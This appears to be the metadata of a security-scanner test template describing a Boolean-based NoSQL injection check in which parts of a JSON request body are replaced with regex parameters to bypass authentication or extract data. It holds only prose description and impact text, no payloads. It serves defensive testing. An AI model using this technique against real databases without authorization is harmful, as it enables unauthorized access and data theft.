  name: "Boolean Based NoSQL Injection test by replacing JSON body with Regex function parameter"
  description: >
    "This test involves exploiting a vulnerability in NoSQL databases by manipulating the JSON payload sent in a query. By substituting parts of the JSON body with a regular expression function parameter, an attacker can craft queries that alter the logic of the database query execution. This technique can reveal information or bypass security controls by leveraging how NoSQL databases handle and interpret regex patterns within their queries."
  details: >
    "In this test, attackers replace sections of a JSON payload with regex function parameters to exploit Boolean-based NoSQL injection vulnerabilities. This involves injecting malicious regex patterns into queries, potentially bypassing authentication or data validation mechanisms. By observing changes in the query's Boolean logic or response behavior, attackers can identify and manipulate the underlying database logic, leading to unauthorized access or data retrieval."
  impact: >
    "The impact of this NoSQL injection technique can be severe, as it may allow attackers to bypass authentication, gain unauthorized access to sensitive data, or manipulate database queries. By exploiting Boolean logic vulnerabilities, they can execute arbitrary queries, potentially leading to data breaches or corruption. Additionally, such vulnerabilities can compromise the overall security and integrity of the NoSQL database and its applications."
